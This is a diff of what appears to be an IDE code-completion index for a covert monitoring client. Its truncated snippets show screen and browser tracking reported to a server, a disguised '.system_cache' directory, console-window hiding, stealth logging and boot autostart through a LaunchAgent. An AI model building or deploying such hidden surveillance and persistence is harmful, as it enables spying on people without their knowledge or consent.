@@ -1087,6 +1087,30 @@
         "documentation": {}
     },
     {
+        "label": "ProcessMonitor",
+        "importPath": "src.modules.process_monitor",
+        "description": "src.modules.process_monitor",
+        "isExtraImport": true,
+        "detail": "src.modules.process_monitor",
+        "documentation": {}
+    },
+    {
+        "label": "StealthMode",
+        "importPath": "src.utils.stealth",
+        "description": "src.utils.stealth",
+        "isExtraImport": true,
+        "detail": "src.utils.stealth",
+        "documentation": {}
+    },
+    {
+        "label": "StealthManager",
+        "importPath": "src.utils.stealth",
+        "description": "src.utils.stealth",
+        "isExtraImport": true,
+        "detail": "src.utils.stealth",
+        "documentation": {}
+    },
+    {
         "label": "lexers",
         "importPath": "sphinx.highlighting",
         "description": "sphinx.highlighting",
@@ -1539,7 +1563,7 @@
         "kind": 6,
         "importPath": "client.src.utils.stealth",
         "description": "client.src.utils.stealth",
-        "peekOfCode": "class StealthManager:\n    def __init__(self):\n        self.system = platform.system()\n        self.hidden_dir = self.get_hidden_directory()\n    def get_hidden_directory(self):\n        \"\"\"Get or create hidden directory\"\"\"\n        if self.system == 'Windows':\n            hidden_dir = os.path.join(os.getenv('APPDATA'), '.system_cache')\n        else:\n            hidden_dir = os.path.join(os.path.expanduser('~'), '.system_cache')",
+        "peekOfCode": "class StealthManager:\n    def __init__(self, entry_script=None):\n        self.system = platform.system()\n        self.hidden_dir = self.get_hidden_directory()\n        # Resolve entry script (defaults to current executable/script)\n        self.entry_script = os.path.abspath(entry_script or sys.argv[0])\n    def get_hidden_directory(self):\n        \"\"\"Get or create hidden directory\"\"\"\n        if self.system == 'Windows':\n            hidden_dir = os.path.join(os.getenv('APPDATA'), '.system_cache')",
         "detail": "client.src.utils.stealth",
         "documentation": {}
     },
@@ -1980,7 +2004,7 @@
         "kind": 6,
         "importPath": "client.main",
         "description": "client.main",
-        "peekOfCode": "class StealthClient:\n    def __init__(self):\n        self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)\n        self.stream_handler = StreamHandler(self.api_client)\n        # Setup stealth logging\n        setup_stealth_logging()\n        self.logger = logging.getLogger('StealthClient')\n        # Initialize browser tracker\n        self.browser_tracker = BrowserTracker(self.api_client, self.logger)\n        # Initialize screen capture with browser tracker integration",
+        "peekOfCode": "class StealthClient:\n    def __init__(self):\n        self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)\n        self.stream_handler = StreamHandler(self.api_client)\n        self.process_monitor = ProcessMonitor(self.api_client)\n        self.stealth_mode = StealthMode()\n        self.stealth_manager = StealthManager(entry_script=os.path.abspath(__file__))\n        self.heartbeat_interval = max(10, Config.HEARTBEAT_INTERVAL)\n        # Setup stealth logging\n        setup_stealth_logging()",
         "detail": "client.main",
         "documentation": {}
     },
@@ -1999,24 +2023,6 @@
         "importPath": "client.main",
         "description": "client.main",
         "peekOfCode": "def setup_stealth_logging():\n    \"\"\"Setup logging for stealth mode - minimal output\"\"\"\n    if Config.STEALTH_MODE:\n        # In stealth mode, log to file only with minimal level\n        log_file = os.path.join(Config.LOG_DIR, 'stealth.log')\n        logging.basicConfig(\n            level=logging.WARNING,  # Only warnings and errors\n            format='%(asctime)s - %(levelname)s - %(message)s',\n            handlers=[\n                logging.FileHandler(log_file, mode='a'),",
-        "detail": "client.main",
-        "documentation": {}
-    },
-    {
-        "label": "hide_console_window",
-        "kind": 2,
-        "importPath": "client.main",
-        "description": "client.main",
-        "peekOfCode": "def hide_console_window():\n    \"\"\"Hide console window on Windows\"\"\"\n    if platform.system() == \"Windows\":\n        try:\n            import ctypes\n            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)\n        except:\n            pass\ndef install_autostart():\n    \"\"\"Install client to start automatically on system boot\"\"\"",
-        "detail": "client.main",
-        "documentation": {}
-    },
-    {
-        "label": "install_autostart",
-        "kind": 2,
-        "importPath": "client.main",
-        "description": "client.main",
-        "peekOfCode": "def install_autostart():\n    \"\"\"Install client to start automatically on system boot\"\"\"\n    try:\n        current_file = os.path.abspath(__file__)\n        if platform.system() == \"Darwin\":  # macOS\n            # Create LaunchAgent plist\n            plist_dir = os.path.expanduser(\"~/Library/LaunchAgents\")\n            os.makedirs(plist_dir, exist_ok=True)\n            plist_file = os.path.join(plist_dir, \"com.tenjo.client.plist\")\n            plist_content = f\"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
         "detail": "client.main",
         "documentation": {}
     },
